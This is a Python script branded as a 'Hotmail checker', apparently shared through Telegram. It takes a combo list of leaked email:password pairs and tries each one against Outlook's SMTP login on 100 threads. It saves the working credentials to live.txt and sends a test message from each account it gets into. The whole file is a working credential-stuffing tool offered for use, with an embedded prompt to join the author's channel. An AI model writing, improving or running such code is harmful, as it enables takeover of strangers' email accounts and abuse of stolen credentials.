import os
import time
import smtplib
import traceback
import webbrowser
import concurrent.futures
from colorama import Fore


live = open('live.txt', 'w')
dead = open('dead.txt', 'w')

def banner():
	os.system('clear')
	print(f"""  _    _  ____ _______ __  __          _____ _      
 | |  | |/ __ \__   __|  \/  |   /\   |_   _| |     
 | |__| | |  | | | |  | \  / |  /  \    | | | |     
 |  __  | |  | | | |  | |\/| | / /\ \   | | | |     
 | |  | | |__| | | |  | |  | |/ ____ \ _| |_| |____ 
 |_|  |_|\____/  |_|  |_|  |_/_/    \_\_____|______| 
 
---------------------------------------------------
         Developer : Fahim Hossen
         Tool : HOTMAIL CHECKER
         Telegram : https://t.me/fahimhossen27
         Telegram Channel : TEAM X RMBD
---------------------------------------------------

""")


def check(subject, body, to_email, sender_email, sender_password):
    try:
        message = f"Subject: {subject}\n\n{body}"
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message)
        server.quit()

        return None
    except smtplib.SMTPAuthenticationError:
        return "Authentication failed."
    except Exception as e:
        error_message = f"{str(e)}\n{traceback.format_exc()}"
        return error_message
    
def check_emailpass(emailpass):
    global live
    global dead
    e = str(emailpass).split(':')
    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
    if c is None:
        with open('live.txt', 'a') as file:
            file.write(emailpass + '\n')
        print(Fore.CYAN, emailpass, Fore.WHITE, '->', Fore.LIGHTGREEN_EX, 'Login Success', Fore.WHITE)
    else:
        with open('dead.txt', 'a') as file:
            file.write(emailpass)
        print(Fore.CYAN, emailpass, Fore.WHITE, '->', Fore.LIGHTRED_EX, c, Fore.WHITE)
    return

banner()

i = input('---------------------------------------------------\nEnter Youre Combo List : ')
print('---------------------------------------------------')
with open(i, 'r') as file:
    emails = [line.strip() for line in file]
    lol = input("You're Live mail will Saved in : live.txt\nYou're Dead mail will Saved in : dead.txt\n---------------------------------------------------\nPress Enter to start checking and Join our Channel")
    os.system("xdg-open https://t.me/+VssZW7u2USRhMmNl")
    webbrowser.open("https://t.me/+VssZW7u2USRhMmNl")
    time.sleep(.3)

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = list(executor.map(check_emailpass, emails))
